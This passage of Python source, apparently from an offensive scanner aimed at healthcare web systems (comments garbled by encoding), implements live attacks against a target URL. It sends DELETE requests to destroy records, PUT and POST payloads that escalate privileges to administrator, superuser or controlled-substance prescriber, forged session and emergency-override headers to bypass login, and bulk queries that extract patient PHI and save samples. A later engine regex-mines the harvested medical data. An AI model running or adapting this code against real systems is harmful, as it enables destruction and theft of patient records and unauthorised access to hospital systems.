                                            await self._process_tampering_response(resp, attack_type, endpoint, method, payload, results)
                                    
                                    elif method == 'DELETE':
                                        # DELETEæ”»å‡»ï¼ˆæ•°æ®ç ´åï¼‰
                                        async with session.delete(full_url, headers=headers, timeout=8, ssl=False) as resp:
                                            if resp.status in [200, 202, 204]:
                                                result = {
                                                    'type': f'{attack_type}_deletion_success',
                                                    'endpoint': endpoint,
                                                    'method': method,
                                                    'target_id': test_id,
                                                    'response_status': resp.status,
                                                    'severity': 'critical',
                                                    'compliance_impact': 'HIPAA_GDPR_violation',
                                                    'timestamp': datetime.now().isoformat()
                                                }
                                                results.append(result)
                                                self.data_tampering_results.append(result)
                                                print(f"    [ğŸš¨] æ•°æ®åˆ é™¤æˆåŠŸ: {endpoint} (ID: {test_id})")
                                
                                except asyncio.TimeoutError:
                                    continue
                                except Exception:
                                    continue
            
            return results
        
        async def _process_tampering_response(self, resp, attack_type: str, endpoint: str, method: str, payload: Dict, results: List):
            """å¤„ç†ç¯¡æ”¹å“åº”"""
            if resp.status in [200, 201, 202]:
                try:
                    response_data = await resp.json()
                    
                    # æ£€æŸ¥æ˜¯å¦çœŸçš„ç¯¡æ”¹æˆåŠŸ
                    tampering_confirmed = False
                    for key, value in payload.items():
                        if key in response_data and response_data[key] == value:
                            tampering_confirmed = True
                            break
                    
                    if tampering_confirmed or resp.status == 201:
                        result = {
                            'type': f'{attack_type}_tampering_success',
                            'endpoint': endpoint,
                            'method': method,
                            'payload': payload,
                            'response_status': resp.status,
                            'response_data': response_data,
                            'severity': 'critical',
                            'compliance_impact': 'medical_data_integrity_compromised',
                            'timestamp': datetime.now().isoformat()
                        }
                        results.append(result)
                        self.data_tampering_results.append(result)
                        print(f"    [] æ•°æ®ç¯¡æ”¹æˆåŠŸ: {endpoint} - {method}")
                
                except:
                    # å³ä½¿è§£æå¤±è´¥ï¼ŒæˆåŠŸçš„çŠ¶æ€ç ä¹Ÿå€¼å¾—è®°å½•
                    if resp.status in [200, 201, 202]:
                        result = {
                            'type': f'{attack_type}_potential_tampering',
                            'endpoint': endpoint,
                            'method': method,
                            'payload': payload,
                            'response_status': resp.status,
                            'severity': 'high',
                            'timestamp': datetime.now().isoformat()
                        }
                        results.append(result)
        
        async def _execute_privilege_escalation_attacks(self) -> List[Dict]:
            """æ‰§è¡Œæƒé™æå‡æ”»å‡»"""
            print(f"[â¬†ï¸] æ‰§è¡Œæƒé™æå‡æ”»å‡»...")
            
            escalation_results = []
            
            # æƒé™æå‡è½½è·
            privilege_payloads = [
                # è§’è‰²æå‡
                {"role": "administrator", "permissions": ["all"]},
                {"user_type": "admin", "access_level": "full"},
                {"is_superuser": True, "is_staff": True},
                
                # åŒ»ç–—ç‰¹å®šæƒé™æå‡
                {"medical_role": "chief_physician", "department_access": "all"},
                {"prescriber_authority": True, "controlled_substances_auth": True},
                {"patient_data_access": "unrestricted", "phi_access": True},
                
                # ç³»ç»Ÿçº§æƒé™
                {"system_admin": True, "debug_mode": True},
                {"maintenance_mode": False, "audit_bypass": True}
            ]
            
            # æƒé™æå‡ç«¯ç‚¹
            privilege_endpoints = [
                '/api/users/profile',
                '/api/user/update',
                '/api/profile',
                '/api/account/settings',
                '/fhir/Practitioner',
                '/api/staff/permissions'
            ]
            
            async with aiohttp.ClientSession() as session:
                for endpoint in privilege_endpoints[:3]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
                    full_url = urljoin(self.parent.target_url, endpoint)
                    
                    for payload in privilege_payloads[:4]:  # é™åˆ¶è½½è·æ•°é‡
                        try:
                            headers = {
                                'Content-Type': 'application/json',
                                'Authorization': 'Bearer invalid_token_bypass_test',
                                'X-Privilege-Escalation': 'true'
                            }
                            
                            # å°è¯•PUTæƒé™æå‡
                            async with session.put(full_url, json=payload, headers=headers, timeout=8, ssl=False) as resp:
                                if resp.status in [200, 202]:
                                    result = {
                                        'type': 'privilege_escalation_success',
                                        'endpoint': endpoint,
                                        'payload': payload,
                                        'response_status': resp.status,
                                        'method': 'PUT',
                                        'severity': 'critical',
                                        'compliance_impact': 'unauthorized_access_granted',
                                        'timestamp': datetime.now().isoformat()
                                    }
                                    escalation_results.append(result)
                                    self.privilege_escalation_attempts.append(result)
                                    print(f"    [ğŸš¨] æƒé™æå‡æˆåŠŸ: {endpoint}")
                            
                            # å°è¯•POSTæƒé™æå‡
                            async with session.post(full_url, json=payload, headers=headers, timeout=8, ssl=False) as resp:
                                if resp.status in [200, 201]:
                                    result = {
                                        'type': 'privilege_escalation_creation',
                                        'endpoint': endpoint,
                                        'payload': payload,
                                        'response_status': resp.status,
                                        'method': 'POST',
                                        'severity': 'critical',
                                        'timestamp': datetime.now().isoformat()
                                    }
                                    escalation_results.append(result)
                                    self.privilege_escalation_attempts.append(result)
                                    print(f"    [] æƒé™åˆ›å»ºæˆåŠŸ: {endpoint}")
                        
                        except Exception:
                            continue
            
            return escalation_results
        
        async def _execute_session_hijacking_attacks(self) -> List[Dict]:
            """æ‰§è¡Œä¼šè¯åŠ«æŒæ”»å‡»"""
            print(f"[ğŸ”“] æ‰§è¡Œä¼šè¯åŠ«æŒæ”»å‡»...")
            
            hijacking_results = []
            
            # ä¼šè¯åŠ«æŒæŠ€æœ¯
            hijack_techniques = [
                # ä¼šè¯å›ºå®š
                {'technique': 'session_fixation', 'headers': {'Cookie': 'SESSIONID=admin_fixed_session'}},
                
                # ä¼šè¯æ³¨å…¥
                {'technique': 'session_injection', 'headers': {'X-Session-ID': 'admin123', 'X-User-ID': 'admin'}},
                
                # åŒ»ç–—ä¼šè¯ç»•è¿‡
                {'technique': 'medical_session_bypass', 'headers': {
                    'X-Medical-Session': 'emergency_override',
                    'X-Hospital-Auth': 'emergency_access',
                    'X-Doctor-ID': 'emergency_physician'
                }},
                
                # æ—¶é—´ç›¸å…³ä¼šè¯æ”»å‡»
                {'technique': 'temporal_session_attack', 'headers': {
                    'X-Session-Time': '1970-01-01',
                    'X-Login-Time': '1970-01-01T00:00:00Z',
                    'X-Session-Duration': '999999999'
                }}
            ]
            
            # æµ‹è¯•ç«¯ç‚¹
            session_endpoints = [
                '/api/auth/session',
                '/api/login/verify', 
                '/api/user/session',
                '/dashboard',
                '/admin',
                '/fhir/metadata'
            ]
            
            async with aiohttp.ClientSession() as session:
                for endpoint in session_endpoints[:3]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
                    full_url = urljoin(self.parent.target_url, endpoint)
                    
                    for hijack_config in hijack_techniques[:3]:  # é™åˆ¶æŠ€æœ¯æ•°é‡
                        try:
                            async with session.get(full_url, headers=hijack_config['headers'], timeout=8, ssl=False) as resp:
                                if resp.status == 200:
                                    # æ£€æŸ¥æ˜¯å¦æˆåŠŸç»•è¿‡è®¤è¯
                                    content = await resp.text()
                                    if any(indicator in content.lower() for indicator in [
                                        'dashboard', 'admin', 'welcome', 'profile', 'settings', 'logout'
                                    ]):
                                        result = {
                                            'type': 'session_hijacking_success',
                                            'technique': hijack_config['technique'],
                                            'endpoint': endpoint,
                                            'headers_used': hijack_config['headers'],
                                            'response_status': resp.status,
                                            'content_preview': content[:200],
                                            'severity': 'critical',
                                            'timestamp': datetime.now().isoformat()
                                        }
                                        hijacking_results.append(result)
                                        print(f"    [ğŸš¨] ä¼šè¯åŠ«æŒæˆåŠŸ: {hijack_config['technique']} at {endpoint}")
                        
                        except Exception:
                            continue
            
            return hijacking_results
        
        async def _execute_api_abuse_discovery(self) -> List[Dict]:
            """æ‰§è¡ŒAPIæ»¥ç”¨å‘ç°"""
            print(f"[] æ‰§è¡ŒAPIæ»¥ç”¨å‘ç°...")
            
            abuse_results = []
            
            # APIæ»¥ç”¨æ¨¡å¼
            abuse_patterns = [
                # æ‰¹é‡æ•°æ®æå–
                {'pattern': 'bulk_data_extraction', 'params': {'limit': '999999', 'offset': '0'}},
                {'pattern': 'unlimited_pagination', 'params': {'page_size': '100000', 'page': '1'}},
                
                # æ•æ„Ÿæ•°æ®æš´éœ²
                {'pattern': 'sensitive_field_exposure', 'params': {'include': 'password,ssn,phone,email,address'}},
                {'pattern': 'medical_data_exposure', 'params': {'include_phi': 'true', 'include_sensitive': 'true'}},
                
                # æƒé™ç»•è¿‡
                {'pattern': 'authorization_bypass', 'params': {'bypass_auth': 'true', 'admin_override': 'true'}},
                
                # æ—¶é—´èŒƒå›´æ»¥ç”¨  
                {'pattern': 'temporal_data_extraction', 'params': {
                    'start_date': '1970-01-01',
                    'end_date': '2099-12-31',
                    'include_deleted': 'true'
                }}
            ]
            
            # æµ‹è¯•ç«¯ç‚¹
            api_endpoints = [
                '/api/patients',
                '/api/users',
                '/api/appointments',
                '/fhir/Patient',
                '/api/prescriptions',
                '/api/medical-records'
            ]
            
            async with aiohttp.ClientSession() as session:
                for endpoint in api_endpoints[:4]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
                    full_url = urljoin(self.parent.target_url, endpoint)
                    
                    for abuse_config in abuse_patterns[:4]:  # é™åˆ¶æ¨¡å¼æ•°é‡
                        try:
                            async with session.get(full_url, params=abuse_config['params'], timeout=15, ssl=False) as resp:
                                if resp.status == 200:
                                    try:
                                        data = await resp.json()
                                        
                                        # åˆ†æå“åº”æ˜¯å¦è¡¨æ˜æ»¥ç”¨æˆåŠŸ
                                        data_size = len(data) if isinstance(data, list) else 1
                                        response_size = len(str(data))
                                        
                                        # æ£€æµ‹æ»¥ç”¨æˆåŠŸçš„æŒ‡æ ‡
                                        abuse_detected = False
                                        abuse_indicators = []
                                        
                                        if data_size > 1000:  # å¤§é‡æ•°æ®è¿”å›
                                            abuse_detected = True
                                            abuse_indicators.append(f'large_dataset_{data_size}_records')
                                        
                                        if response_size > 100000:  # å¤§å“åº”ä½“
                                            abuse_detected = True
                                            abuse_indicators.append(f'large_response_{response_size}_bytes')
                                        
                                        # æ£€æŸ¥æ•æ„Ÿå­—æ®µ
                                        sensitive_fields = ['password', 'ssn', 'phone', 'email', 'address', 'phi']
                                        data_str = str(data).lower()
                                        found_sensitive = [field for field in sensitive_fields if field in data_str]
                                        if found_sensitive:
                                            abuse_detected = True
                                            abuse_indicators.append(f'sensitive_fields_{found_sensitive}')
                                        
                                        if abuse_detected:
                                            result = {
                                                'type': 'api_abuse_success',
                                                'pattern': abuse_config['pattern'],
                                                'endpoint': endpoint,
                                                'params_used': abuse_config['params'],
                                                'data_size': data_size,
                                                'response_size': response_size,
                                                'abuse_indicators': abuse_indicators,
                                                'severity': 'high',
                                                'compliance_impact': 'data_privacy_violation',
                                                'timestamp': datetime.now().isoformat()
                                            }
                                            abuse_results.append(result)
                                            print(f"    [] APIæ»¥ç”¨æˆåŠŸ: {abuse_config['pattern']} at {endpoint}")
                                    
                                    except:
                                        # å³ä½¿è§£æå¤±è´¥ï¼Œ200çŠ¶æ€ä¹Ÿå¯èƒ½è¡¨æ˜æ»¥ç”¨æˆåŠŸ
                                        pass
                        
                        except Exception:
                            continue
            
            return abuse_results
        
        async def _trigger_compliance_violations(self) -> List[Dict]:
            """è§¦å‘åˆè§„æ€§è¿è§„"""
            print(f"[âš–ï¸] è§¦å‘åˆè§„æ€§è¿è§„æµ‹è¯•...")
            
            violation_results = []
            
            # åˆè§„æ€§è¿è§„æµ‹è¯•
            compliance_tests = [
                # HIPAAè¿è§„æµ‹è¯•
                {
                    'violation_type': 'HIPAA_PHI_exposure',
                    'endpoint': '/api/patients',
                    'params': {'export_format': 'csv', 'include_phi': 'true'},
                    'expected_impact': 'HIPAA_Section_164.502_violation'
                },
                
                # GDPRè¿è§„æµ‹è¯•
                {
                    'violation_type': 'GDPR_data_export',
                    'endpoint': '/api/users/export',
                    'params': {'format': 'json', 'include_personal_data': 'true'},
                    'expected_impact': 'GDPR_Article_6_violation'
                },
                
                # æ—¥æœ¬ä¸ªäººæƒ…æŠ¥ä¿æŠ¤æ³•è¿è§„
                {
                    'violation_type': 'Japan_personal_info_leak',
                    'endpoint': '/api/patients/search',
                    'params': {'export_personal_info': 'true', 'include_medical_history': 'true'},
                    'expected_impact': 'Personal_Information_Protection_Act_violation'
                },
                
                # åŒ»ç–—æœºå™¨æ³•è¿è§„
                {
                    'violation_type': 'medical_device_data_access',
                    'endpoint': '/dicom/studies',
                    'params': {'export_images': 'true', 'bypass_authorization': 'true'},
                    'expected_impact': 'Medical_Device_Act_violation'
                }
            ]
            
            async with aiohttp.ClientSession() as session:
                for test_config in compliance_tests:
                    full_url = urljoin(self.parent.target_url, test_config['endpoint'])
                    
                    try:
                        async with session.get(full_url, params=test_config['params'], timeout=10, ssl=False) as resp:
                            if resp.status == 200:
                                try:
                                    data = await resp.json()
                                    
                                    # æ£€æŸ¥æ˜¯å¦çœŸçš„è¿åäº†åˆè§„æ€§
                                    violation_confirmed = False
                                    violation_evidence = []
                                    
                                    if isinstance(data, list) and len(data) > 0:
                                        violation_confirmed = True
                                        violation_evidence.append(f'exported_{len(data)}_records')
                                    
                                    # æ£€æŸ¥ä¸ªäººæ•æ„Ÿä¿¡æ¯
                                    data_str = str(data).lower()
                                    sensitive_indicators = ['phone', 'email', 'address', 'ssn', 'patient_id', 'medical_record']
                                    found_sensitive = [ind for ind in sensitive_indicators if ind in data_str]
                                    if found_sensitive:
                                        violation_confirmed = True
                                        violation_evidence.extend(found_sensitive)
                                    
                                    if violation_confirmed:
                                        result = {
                                            'type': 'compliance_violation_triggered',
                                            'violation_type': test_config['violation_type'],
                                            'endpoint': test_config['endpoint'],
                                            'params_used': test_config['params'],
                                            'expected_impact': test_config['expected_impact'],
                                            'violation_evidence': violation_evidence,
                                            'data_sample': str(data)[:500],
                                            'severity': 'critical',
                                            'legal_risk': 'high',
                                            'timestamp': datetime.now().isoformat()
                                        }
                                        violation_results.append(result)
                                        print(f"    [ğŸš¨] åˆè§„è¿è§„è§¦å‘: {test_config['violation_type']}")
                                
                                except:
                                    pass
                    
                    except Exception:
                        continue
            
            return violation_results
        
        def get_manipulation_summary(self) -> Dict[str, Any]:
            """è·å–æ“ä½œæ‘˜è¦"""
            return {
                'total_successful_manipulations': len(self.successful_manipulations),
                'data_tampering_count': len(self.data_tampering_results),
                'privilege_escalation_count': len(self.privilege_escalation_attempts),
                'cache_efficiency': len(self.bypass_success_cache),
                'attack_modes_enabled': sum(1 for mode in self.attack_modes.values() if mode),
                'manipulation_categories': {
                    'time_manipulation': len([m for m in self.successful_manipulations if 'time_manipulation' in m['type']]),
                    'data_tampering': len(self.data_tampering_results),
                    'privilege_escalation': len(self.privilege_escalation_attempts),
                    'session_attacks': len([m for m in self.successful_manipulations if 'session' in m['type']]),
                    'api_abuse': len([m for m in self.successful_manipulations if 'api_abuse' in m['type']]),
                    'compliance_violations': len([m for m in self.successful_manipulations if 'compliance_violation' in m['type']])
                }
            }

    #  P0 æ ¸å¿ƒå¼•æ“2ï¼šè¢«åŠ¨æŒ–æ˜å¼•æ“ - å…³é”®ç¼ºå¤±è¡¥å®Œ  
    class PassiveMiningEngine:
        """è¢«åŠ¨æŒ–æ˜å¼•æ“ - æ™ºèƒ½æ•°æ®æ”¶é›†ã€æ¨¡å¼è¯†åˆ«ã€æƒ…æŠ¥æå–"""
        
        def __init__(self, parent_scanner):
            self.parent = parent_scanner
            self.intelligence_database = {}
            self.pattern_signatures = {}
            self.behavioral_profiles = {}
            self.threat_indicators = set()
            self.data_correlation_graph = defaultdict(list)
            self.mining_cache = LRUCache(maxsize=2000)
            
            # æŒ–æ˜å¼•æ“é…ç½®
            self.mining_modes = {
                'pattern_recognition': True,
                'behavioral_analysis': True,
                'threat_intelligence': True,
                'data_correlation': True,
                'vulnerability_clustering': True,
                'compliance_gap_analysis': True
            }
            
            # åŒ»ç–—ç‰¹å®šæŒ–æ˜æ¨¡å¼
            self.medical_mining_patterns = {
                'patient_data_leakage': {
                    'signatures': [
                        r'patient[_-]?id[:=]\s*[\w\d]+',
                        r'medical[_-]?record[:=]\s*[\w\d]+',
                        r'diagnosis[:=]\s*[^,\n]{10,}',
                        r'prescription[:=]\s*[^,\n]{5,}'
                    ],
                    'severity': 'critical',
                    'compliance_impact': 'HIPAA_GDPR_violation'
                },
                'healthcare_infrastructure': {
                    'signatures': [
                        r'(?:HL7|FHIR|DICOM)[_-]?(?:server|endpoint|api)',
                        r'(?:hospital|clinic|medical)[_-]?(?:system|network|database)',
                        r'(?:EMR|EHR|HIS|RIS|PACS)[_-]?(?:access|login|admin)'
                    ],
                    'severity': 'high',
                    'compliance_impact': 'medical_infrastructure_exposure'
                },
                'pharmaceutical_data': {
                    'signatures': [
                        r'drug[_-]?(?:database|inventory|stock)',
                        r'prescription[_-]?(?:system|database|records)',
                        r'medication[_-]?(?:list|history|dosage)'
                    ],
                    'severity': 'high',
                    'compliance_impact': 'pharmaceutical_regulation_violation'
                }
            }
            
            # æ™ºèƒ½å…³è”è§„åˆ™
            self.correlation_rules = {
                'temporal_correlation': self._temporal_correlation_analysis,
                'structural_correlation': self._structural_correlation_analysis,
                'behavioral_correlation': self._behavioral_correlation_analysis,
                'threat_correlation': self._threat_correlation_analysis
            }
        
        async def execute_passive_mining_campaign(self) -> Dict[str, Any]:
            """æ‰§è¡Œè¢«åŠ¨æŒ–æ˜æ´»åŠ¨"""
            print(f"\n[] è¢«åŠ¨æŒ–æ˜å¼•æ“å¯åŠ¨...")
            
            mining_results = {
                'patterns_discovered': 0,
                'behavioral_profiles_created': 0,
                'threat_indicators_found': 0,
                'data_correlations_identified': 0,
                'vulnerability_clusters': 0,
                'compliance_gaps_detected': 0,
                'intelligence_items': 0
            }
            
            # 1. æ¨¡å¼è¯†åˆ«æŒ–æ˜
            if self.mining_modes['pattern_recognition']:
                pattern_results = await self._execute_pattern_recognition_mining()
                mining_results['patterns_discovered'] = len(pattern_results)
                mining_results['intelligence_items'] += len(pattern_results)
            
            # 2. è¡Œä¸ºåˆ†ææŒ–æ˜
            if self.mining_modes['behavioral_analysis']:
                behavioral_results = await self._execute_behavioral_analysis_mining()
                mining_results['behavioral_profiles_created'] = len(behavioral_results)
                mining_results['intelligence_items'] += len(behavioral_results)
            
            # 3. å¨èƒæƒ…æŠ¥æŒ–æ˜
            if self.mining_modes['threat_intelligence']:
                threat_results = await self._execute_threat_intelligence_mining()
                mining_results['threat_indicators_found'] = len(threat_results)
                mining_results['intelligence_items'] += len(threat_results)
            
            # 4. æ•°æ®å…³è”æŒ–æ˜
            if self.mining_modes['data_correlation']:
                correlation_results = await self._execute_data_correlation_mining()
                mining_results['data_correlations_identified'] = len(correlation_results)
                mining_results['intelligence_items'] += len(correlation_results)
            
            # 5. æ¼æ´èšç±»æŒ–æ˜
            if self.mining_modes['vulnerability_clustering']:
                cluster_results = await self._execute_vulnerability_clustering()
                mining_results['vulnerability_clusters'] = len(cluster_results)
                mining_results['intelligence_items'] += len(cluster_results)
            
            # 6. åˆè§„å·®è·åˆ†æ
            if self.mining_modes['compliance_gap_analysis']:
                compliance_results = await self._execute_compliance_gap_analysis()
                mining_results['compliance_gaps_detected'] = len(compliance_results)
                mining_results['intelligence_items'] += len(compliance_results)
            
            print(f"[] è¢«åŠ¨æŒ–æ˜å¼•æ“å®Œæˆ:")
            print(f"    æ€»æƒ…æŠ¥é¡¹ç›®: {mining_results['intelligence_items']}")
            print(f"    å‘ç°æ¨¡å¼: {mining_results['patterns_discovered']}")
            print(f"    è¡Œä¸ºæ¡£æ¡ˆ: {mining_results['behavioral_profiles_created']}")
            print(f"    å¨èƒæŒ‡æ ‡: {mining_results['threat_indicators_found']}")
            print(f"    æ•°æ®å…³è”: {mining_results['data_correlations_identified']}")
            
            return mining_results
        
        async def _execute_pattern_recognition_mining(self) -> List[Dict]:
            """æ‰§è¡Œæ¨¡å¼è¯†åˆ«æŒ–æ˜"""
            print(f"[] æ‰§è¡Œæ¨¡å¼è¯†åˆ«æŒ–æ˜...")
            
            pattern_discoveries = []
            
            # åˆ†æå·²æ”¶é›†çš„æ•°æ®è®°å½•
            data_sources = []
            if hasattr(self.parent, 'data_records'):
                data_sources.extend(self.parent.data_records)
            if hasattr(self.parent, 'historical_data'):
                data_sources.extend(self.parent.historical_data)
            
            # å¯¹æ¯ç§åŒ»ç–—æŒ–æ˜æ¨¡å¼è¿›è¡Œåˆ†æ
            for pattern_type, pattern_config in self.medical_mining_patterns.items():
                discoveries = await self._mine_medical_patterns(pattern_type, pattern_config, data_sources)
                pattern_discoveries.extend(discoveries)
            
            # æ‰§è¡Œæ·±åº¦æ¨¡å¼æŒ–æ˜
            deep_patterns = await self._execute_deep_pattern_mining()
            pattern_discoveries.extend(deep_patterns)
            
            return pattern_discoveries
        
        async def _mine_medical_patterns(self, pattern_type: str, pattern_config: Dict, data_sources: List) -> List[Dict]:
            """æŒ–æ˜åŒ»ç–—æ¨¡å¼"""
            discoveries = []
            
            for data_item in data_sources:
                # æå–å¯åˆ†æçš„æ–‡æœ¬æ•°æ®
                text_data = self._extract_text_from_data_item(data_item)
                
                if text_data:
                    # å¯¹æ¯ä¸ªç­¾åæ¨¡å¼è¿›è¡ŒåŒ¹é…
                    for signature in pattern_config['signatures']:
                        matches = re.findall(signature, text_data, re.IGNORECASE)
                        
                        if matches:
                            discovery = {
                                'type': f'medical_pattern_{pattern_type}',
                                'pattern_signature': signature,
                                'matches': matches[:5],  # é™åˆ¶åŒ¹é…æ•°é‡
                                'source_data': self._get_data_item_identifier(data_item),
                                'severity': pattern_config['severity'],
                                'compliance_impact': pattern_config['compliance_impact'],
                                'timestamp': datetime.now().isoformat(),
                                'mining_engine': 'passive_pattern_recognition'
                            }
                            discoveries.append(discovery)
                            
                            # æ·»åŠ åˆ°æ¨¡å¼ç­¾åæ•°æ®åº“
                            self.pattern_signatures[signature] = self.pattern_signatures.get(signature, 0) + len(matches)
                            
                            print(f"    [] å‘ç°åŒ»ç–—æ¨¡å¼: {pattern_type} - {len(matches)} matches")
            
            return discoveries
        
        def _extract_text_from_data_item(self, data_item) -> str:
            """ä»æ•°æ®é¡¹æå–æ–‡æœ¬"""
            try:
                if hasattr(data_item, 'data') and data_item.data:
                    return str(data_item.data)
                elif isinstance(data_item, dict):
                    return str(data_item)
                else:
                    return str(data_item)
            except:
                return ""
        
        def _get_data_item_identifier(self, data_item) -> str:
            """è·å–æ•°æ®é¡¹æ ‡è¯†ç¬¦"""
            try:
                if hasattr(data_item, 'record_id'):
                    return data_item.record_id
                elif hasattr(data_item, 'source_url'):
                    return data_item.source_url
                elif isinstance(data_item, dict) and 'url' in data_item:
                    return data_item['url']
                else:
                    return 'unknown_source'
            except:
                return 'unknown_source'
        
        async def _execute_deep_pattern_mining(self) -> List[Dict]:
            """æ‰§è¡Œæ·±åº¦æ¨¡å¼æŒ–æ˜"""
            deep_patterns = []
            
            # æ·±åº¦æ¨¡å¼ï¼šåŸºäºå·²æœ‰æ•°æ®è¿›è¡Œæ™ºèƒ½æ¨æ–­
            
            # 1. URLæ¨¡å¼æŒ–æ˜
            url_patterns = await self._mine_url_patterns()
            deep_patterns.extend(url_patterns)
            
            # 2. å“åº”ç»“æ„æ¨¡å¼æŒ–æ˜
            structure_patterns = await self._mine_response_structure_patterns()
            deep_patterns.extend(structure_patterns)
            
            # 3. æ—¶é—´æ¨¡å¼æŒ–æ˜
            temporal_patterns = await self._mine_temporal_patterns()
            deep_patterns.extend(temporal_patterns)
            
            return deep_patterns
        
        async def _mine_url_patterns(self) -> List[Dict]:
            """æŒ–æ˜URLæ¨¡å¼"""
            url_patterns = []
            urls = set()
            
            # æ”¶é›†æ‰€æœ‰URL
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    if hasattr(record, 'source_url'):
                        urls.add(record.source_url)
            
            # åˆ†æURLæ¨¡å¼
            if urls:
                # æå–è·¯å¾„æ¨¡å¼
                path_patterns = defaultdict(int)
                for url in urls:
                    try:
                        parsed = urlparse(url)
                        path_parts = [part for part in parsed.path.split('/') if part]
                        
                        # ç”Ÿæˆæ¨¡å¼
                        for i in range(len(path_parts)):
                            pattern = '/'.join(path_parts[:i+1])
                            path_patterns[pattern] += 1
                    except:
                        continue
                
                # è¯†åˆ«é«˜é¢‘æ¨¡å¼
                for pattern, frequency in path_patterns.items():
                    if frequency >= 3:  # è‡³å°‘å‡ºç°3æ¬¡
                        url_patterns.append({
                            'type': 'url_pattern_discovery',
                            'pattern': pattern,
                            'frequency': frequency,
                            'mining_method': 'frequency_analysis',
                            'timestamp': datetime.now().isoformat()
                        })
            
            return url_patterns
        
        async def _mine_response_structure_patterns(self) -> List[Dict]:
            """æŒ–æ˜å“åº”ç»“æ„æ¨¡å¼"""
            structure_patterns = []
            
            # åˆ†æJSONå“åº”ç»“æ„
            json_structures = []
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    if hasattr(record, 'data') and isinstance(record.data, dict):
                        structure = self._extract_json_structure(record.data)
                        if structure:
                            json_structures.append(structure)
            
            # è¯†åˆ«å¸¸è§ç»“æ„æ¨¡å¼
            structure_frequency = defaultdict(int)
            for structure in json_structures:
                structure_key = str(sorted(structure.keys()))
                structure_frequency[structure_key] += 1
            
            # æŠ¥å‘Šé«˜é¢‘ç»“æ„
            for structure_key, frequency in structure_frequency.items():
                if frequency >= 2:
                    structure_patterns.append({
                        'type': 'json_structure_pattern',
                        'structure_signature': structure_key,
                        'frequency': frequency,
                        'mining_method': 'structure_analysis',
                        'timestamp': datetime.now().isoformat()
                    })
            
            return structure_patterns
        
        def _extract_json_structure(self, data: Dict, max_depth: int = 2) -> Dict:
            """æå–JSONç»“æ„ç­¾å"""
            structure = {}
            
            if isinstance(data, dict) and max_depth > 0:
                for key, value in data.items():
                    if isinstance(value, dict):
                        structure[key] = 'object'
                    elif isinstance(value, list):
                        structure[key] = 'array'
                    elif isinstance(value, str):
                        structure[key] = 'string'
                    elif isinstance(value, (int, float)):
                        structure[key] = 'number'
                    elif isinstance(value, bool):
                        structure[key] = 'boolean'
                    else:
                        structure[key] = 'unknown'
            
            return structure
        
        async def _mine_temporal_patterns(self) -> List[Dict]:
            """æŒ–æ˜æ—¶é—´æ¨¡å¼"""
            temporal_patterns = []
            
            # æ”¶é›†æ—¶é—´æ•°æ®
            timestamps = []
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    if hasattr(record, 'timestamp'):
                        try:
                            timestamp = datetime.fromisoformat(record.timestamp.replace('Z', '+00:00'))
                            timestamps.append(timestamp)
                        except:
                            continue
            
            # åˆ†ææ—¶é—´æ¨¡å¼
            if len(timestamps) >= 5:
                # æ—¶é—´åˆ†å¸ƒåˆ†æ
                hour_distribution = defaultdict(int)
                day_distribution = defaultdict(int)
                
                for ts in timestamps:
                    hour_distribution[ts.hour] += 1
                    day_distribution[ts.weekday()] += 1
                
                # è¯†åˆ«æ—¶é—´é›†ä¸­æ¨¡å¼
                peak_hour = max(hour_distribution, key=hour_distribution.get)
                peak_day = max(day_distribution, key=day_distribution.get)
                
                temporal_patterns.append({
                    'type': 'temporal_activity_pattern',
                    'peak_hour': peak_hour,
                    'peak_day': peak_day,
                    'total_activities': len(timestamps),
                    'hour_distribution': dict(hour_distribution),
                    'mining_method': 'temporal_clustering',
                    'timestamp': datetime.now().isoformat()
                })
            
            return temporal_patterns
        
        async def _execute_behavioral_analysis_mining(self) -> List[Dict]:
            """æ‰§è¡Œè¡Œä¸ºåˆ†ææŒ–æ˜"""
            print(f"[] æ‰§è¡Œè¡Œä¸ºåˆ†ææŒ–æ˜...")
            
            behavioral_profiles = []
            
            # åˆ†æç³»ç»Ÿè¡Œä¸ºæ¨¡å¼
            system_behavior = await self._analyze_system_behavior_patterns()
            behavioral_profiles.extend(system_behavior)
            
            # åˆ†æAPIè¡Œä¸ºæ¨¡å¼
            api_behavior = await self._analyze_api_behavior_patterns()
            behavioral_profiles.extend(api_behavior)
            
            # åˆ†æå®‰å…¨è¡Œä¸ºæ¨¡å¼
            security_behavior = await self._analyze_security_behavior_patterns()
            behavioral_profiles.extend(security_behavior)
            
            return behavioral_profiles
        
        async def _analyze_system_behavior_patterns(self) -> List[Dict]:
            """åˆ†æç³»ç»Ÿè¡Œä¸ºæ¨¡å¼"""
            behavior_patterns = []
            
            # åˆ†æå“åº”æ—¶é—´æ¨¡å¼
            response_times = []
            status_codes = defaultdict(int)
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    if hasattr(record, 'metadata'):
                        # æ”¶é›†å“åº”æ—¶é—´
                        if 'response_time' in record.metadata:
                            try:
                                response_times.append(float(record.metadata['response_time']))
                            except:
                                pass
                        
                        # æ”¶é›†çŠ¶æ€ç 
                        if 'status_code' in record.metadata:
                            status_codes[record.metadata['status_code']] += 1
            
            # åˆ†æå“åº”æ—¶é—´è¡Œä¸º
            if response_times:
                avg_response_time = sum(response_times) / len(response_times)
                max_response_time = max(response_times)
                min_response_time = min(response_times)
                
                behavior_patterns.append({
                    'type': 'system_performance_behavior',
                    'average_response_time': avg_response_time,
                    'max_response_time': max_response_time,
                    'min_response_time': min_response_time,
                    'total_requests': len(response_times),
                    'performance_classification': 'slow' if avg_response_time > 2.0 else 'normal',
                    'timestamp': datetime.now().isoformat()
                })
            
            # åˆ†æçŠ¶æ€ç åˆ†å¸ƒè¡Œä¸º
            if status_codes:
                total_requests = sum(status_codes.values())
                error_rate = (status_codes.get(500, 0) + status_codes.get(404, 0)) / total_requests * 100
                
                behavior_patterns.append({
                    'type': 'system_reliability_behavior',
                    'status_code_distribution': dict(status_codes),
                    'error_rate_percent': error_rate,
                    'total_requests': total_requests,
                    'reliability_classification': 'unstable' if error_rate > 10 else 'stable',
                    'timestamp': datetime.now().isoformat()
                })
            
            return behavior_patterns
        
        async def _analyze_api_behavior_patterns(self) -> List[Dict]:
            """åˆ†æAPIè¡Œä¸ºæ¨¡å¼"""
            api_patterns = []
            
